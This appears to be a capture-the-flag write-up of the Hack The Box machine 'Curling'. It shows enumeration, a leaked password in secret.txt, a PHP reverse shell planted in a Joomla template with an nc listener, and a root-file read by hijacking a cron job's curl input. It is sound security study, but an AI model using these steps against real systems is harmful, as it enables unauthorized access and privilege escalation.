# Curling

**Date:** 2024-10-04

## Target Setup
I start by saving the target IP address in a file for easier access throughout the session:

```bash
echo 10.10.10.150 > target
```

I also add the domain name `curling.htb` to my `/etc/hosts` file:

```bash
echo "10.10.10.150 curling.htb" >> /etc/hosts
```

---

## Service Enumeration

### Full Port Scan
To identify open ports, I perform a full port scan using `nmap`:

```bash
nmap -p- -v -oN nmap/full_scan -T4 10.10.10.150
```

This reveals two open ports:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Targeted Service Scan
I follow up with a more detailed scan of the identified ports:

```bash
nmap -p22,80 -sV -sC -O -v -oN nmap/target_ports.txt -oX nmap/target_ports.xml 10.10.10.150
```

The scan provides the following output:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
```

### Observations
- **SSH (port 22)**: OpenSSH 7.6p1 running on Ubuntu.
- **HTTP (port 80)**: Apache 2.4.29 hosting a Joomla-based website.

---

## Website Analysis (Port 80)

### Initial Inspection
On the homepage, I notice a potential username, `Floris`, which could be helpful later. The site also mentions a date: **2018**, likely the year of setup.

### Joomla Version Identification
I find the Joomla version by extracting its configuration file:

```bash
curl http://curling.htb/administrator/manifests/files/joomla.xml | grep "<version>"
```

Output:

```xml
<version>3.8.8</version>
```

This Joomla version (3.8.8) could be vulnerable to XSS. A quick search on `searchsploit` reveals the following exploit:

```bash
searchsploit Joomla 3.8.8
```

Result:

```
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting
```

### Secret Discovery
Inspecting the source code of the homepage (`view-source:http://curling.htb`), I find an interesting comment:

```html
<!-- secret.txt -->
```

Navigating to `http://curling.htb/secret.txt`, I find a base64-encoded string:

```
Q3VybGluZzIwMTgh
```

Decoding it:

```bash
echo "Q3VybGluZzIwMTgh" | base64 -d
```

Result:

```
Curling2018!
```

This is likely a password for the `Floris` user. I use it to log in to the Joomla admin panel (`http://curling.htb/administrator`).

---

## Exploiting Joomla for Initial Access

After gaining access to the Joomla admin panel, I refer to [HackTricks - Joomla RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce) for exploiting the system via template modification:

1. Navigate to `Templates` → `Protostar`.
2. Edit a template file like `error.php`, replacing its content with a PHP reverse shell:

```bash
cat /usr/share/webshells/php/php-reverse-shell.php
```

3. Start a listener on your local machine:

```bash
nc -lvnp 1234
```

4. Trigger the shell:

```bash
curl -s "http://curling.htb/templates/protostar/error.php"
```

I successfully get a reverse shell as `www-data`. 

To improve my shell, I spawn a TTY shell:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

---

## Privilege Escalation to User

### Floris' Home Directory
In the `floris` user's home directory, I find a `password_backup` file. It appears to be a compressed file:

```bash
file password_backup
```

Result:

```
password_backup: ASCII text
```

By analyzing the first few bytes (`BZh`), I identify it as a **bz2** file.

### Decompressing the Backup
I decompress the file step by step:

```bash
xxd -r password_backup > password_backup.bz2
bzip2 -d password_backup.bz2
mv password_backup password_backup.gz
gunzip password_backup.gz
mv password_backup password_backup.bz2
bzip2 -d password_backup.bz2
mv password_backup password_backup.tar
```

Finally, I extract the contents:

```bash
tar -xf password_backup
```

Inside, I find Floris' password: `5d<wdCbdZu)|hChXll`.

I use this to SSH into the machine as `floris` and retrieve the user flag.

---

## Privilege Escalation to Root

In Floris' home directory, I find an `admin-area` folder containing two files: `input` and `report`. After analyzing running processes with `pspy64`, I observe a cron job running `curl` with these files.

### Exploiting the Cron Job
I modify the `input` file to point to the root flag:

```bash
echo "url = \"file://root/root.txt\"" > input
```

I quickly read the `report` file to capture the root flag:

```bash
cat report
```

---

## Conclusion
By leveraging Joomla vulnerabilities and analyzing cron job behaviors, I successfully escalate privileges to root and capture all flags. The detailed enumeration and understanding of file signatures played a crucial role in both user and root access.

---

## Resources

* [HackTricks - Joomla](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)
* [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
* [pspy - unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)

---
